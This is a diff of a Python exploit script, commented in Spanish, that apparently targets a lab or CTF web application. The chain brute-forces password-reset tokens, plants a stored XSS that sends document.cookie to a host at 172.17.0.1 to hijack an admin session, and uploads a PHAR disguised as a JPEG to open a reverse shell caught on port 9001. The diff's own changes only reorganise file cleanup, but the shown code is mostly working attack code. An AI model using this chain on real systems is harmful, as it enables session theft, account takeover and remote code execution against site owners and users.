@@ -9,7 +9,6 @@ def handler(sig,frame):
     print("[!] Saliendo...")
     exit(1)
 
-
 signal.signal(signal.SIGINT, handler)
 
 # primero generar los tokens y hacer fuerza bruta para restablecer la constraseña
@@ -22,7 +21,6 @@ def generateSeeds():
 def generateFile(seeds):
         seed1 = seeds[0]
         seed2 = seeds[1]
-        os.remove("generateTokens_v2.php")
         with open('generateTokens_v2.php', 'w') as f:
             file_content = """<?php
         $seed1 = "%s";
@@ -46,9 +44,7 @@ def generateFile(seeds):
             f.close()
             return
 
-
 def generateTokens():
-        os.remove("tokens.txt")
         os.system("php generateTokens_v2.php > tokens.txt")
         
 def bruteforceToken(target):
@@ -77,17 +73,14 @@ def logIn(target):
     s.headers.update({'Cookie':re.match("[^;]*", r.headers['Set-Cookie']).group(0)})
     return s
 
-
 # segundo escalar a admin mediante el XSS
 def crearIndex():
-    os.remove("index.js")
     file_content = """const req = new XMLHttpRequest();
 req.open("POST", "http://172.17.0.1/cookie?c=" + document.cookie);
 req.send();"""
     with open('index.js','w') as f:
         f.write(file_content)
         f.close()
-
 
 def storeXSS(s,target):
     p2 = log.progress("Enviando payload XSS...")
@@ -98,8 +91,7 @@ def storeXSS(s,target):
     os.system("echo 'jajabait' > cookie")
     p2.status("XSS inyectado")
     return
-    
-    
+
 class RequestHandler(BaseHTTPRequestHandler):
     def _send_response(self, file_path):
         """Envia el archivo en la respuesta."""
@@ -128,7 +120,6 @@ class RequestHandler(BaseHTTPRequestHandler):
         else:
             return
 
-
 def run(server_class=HTTPServer, handler_class=RequestHandler):
     server_address = ('', 80)
     httpd = server_class(server_address, handler_class)
@@ -147,10 +138,8 @@ def closeServer():
             subprocess.run(["kill", pid])
     exit(0)
 
-
 # tercero subir un phar en el upload image y obtener la shell
 def createImage():
-    os.remove("image_hex_sin_espacio_v2.jpeg")
     hex_value = "FFD8FFE000104A46494600010100000100010000FFDB0084000906071313121513131315161517171B1A191617181A1F1E1A1A1D181A181A1D181A181D2820181D251D1D1F21312125292B2E2E2E1F3033383330372F2F2F30010A0A0A0505050E05050E2B1913192B2B2B2B2B2B2B2B2B2B2B2B2B2B2B2B2B2B2B2B2B2B2B2B2B2B2B2B2B2B2B2B2B2B2B2B2B2B2B2B2B2B2B2B2B2B2B2B2B2BFFC0001108009C000A"
     with open('image_hex_sin_espacio_v2.jpeg','w') as f:
         f.write(hex_value)
@@ -195,6 +184,11 @@ def reverseShell():
     return
     
 
+def RemoveFileExisting():
+    files = ["cookie", "final_payload.phar", "generateTokens_v2.php", "image_hex_sin_espacio_v2.jpeg", "index.js", "tokens.txt"]
+    for file in files:
+        os.remove(file)
+
 if __name__ == '__main__':
     
     parser = argparse.ArgumentParser()
@@ -214,7 +208,7 @@ if __name__ == '__main__':
     appendPayload(bytesObj)
     file_content = readFile()
     uploadPhar(args.target,session,file_content)
+    RemoveFileExisting()
     threading.Thread(target=reverseShell, args=()).start()
     shell = listen(9001,timeout=20).wait_for_connection()
     shell.interactive()
-       
